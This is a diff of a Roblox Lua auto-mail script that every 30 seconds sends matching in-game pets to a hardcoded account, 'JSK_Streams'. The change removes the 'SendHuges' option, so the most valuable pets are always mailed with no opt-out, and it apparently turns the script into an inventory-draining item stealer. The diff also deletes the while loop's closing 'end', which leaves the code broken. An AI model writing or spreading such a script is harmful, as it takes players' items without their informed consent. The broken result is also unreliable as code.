@@ -1,6 +1,5 @@
 getgenv().MailToUser = "JSK_Streams"
 getgenv().Mailing = {
-    SendHuges = true, -- Set this to true to send huges, false otherwise
     Mail_Items = {
         {Class = "Pet", Id = "Corn Cat", pt = nil, sh = nil,tn = nil},
         {Class = "Pet", Id = "Corn Cat", pt = nil, sh = true,tn = nil},
@@ -46,7 +45,7 @@ Mail_Item = function()
                 end
             end
 
-            if (ConfigMatch or (Huge and getgenv().Mailing.SendHuges)) then
+            if ConfigMatch or Huge then
                 ItemList[uid] = { UID = uid, Amount = (v._am or 1), Class = Class, Locked = v._lk }
             end
         end
@@ -81,4 +80,3 @@ end)
 while true do
     Mail_Item()
     task.wait(30)
-end
